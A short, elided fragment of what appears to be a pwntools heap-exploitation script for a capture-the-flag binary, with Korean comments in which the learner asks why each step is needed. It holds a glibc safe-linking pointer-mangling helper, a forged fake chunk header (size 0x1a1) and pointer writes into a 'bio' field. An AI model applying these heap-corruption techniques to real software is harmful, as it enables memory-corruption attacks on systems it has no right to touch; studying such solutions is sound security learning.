...
def mangle(ptr, pos): # mangle이 필요한 이유가 뭐지?
    return ptr ^ (pos >> 12)
...
def main():
    ...
    r.sendlineafter(b"card:", p64(0)+p64(0x1a1)) # 왜 여기서 이런걸 하고 있는걸까?
    r.sendlineafter(b"[Y/n]", b"n")
    ...
    r.sendlineafter(b"choice:", b"4")
    r.sendlineafter(b"[Y/n]", b"y")
    r.sendafter(b"bio:", p64(exe.address+0x4250)*2) # 0x4250을 더해주고 2를 곱해주는 이유가 뭘까
    r.sendlineafter(b"[Y/n]", b"n")
    r.sendlineafter(b"[Y/n]", b"n")
    p0 = order()
    b0 = order()
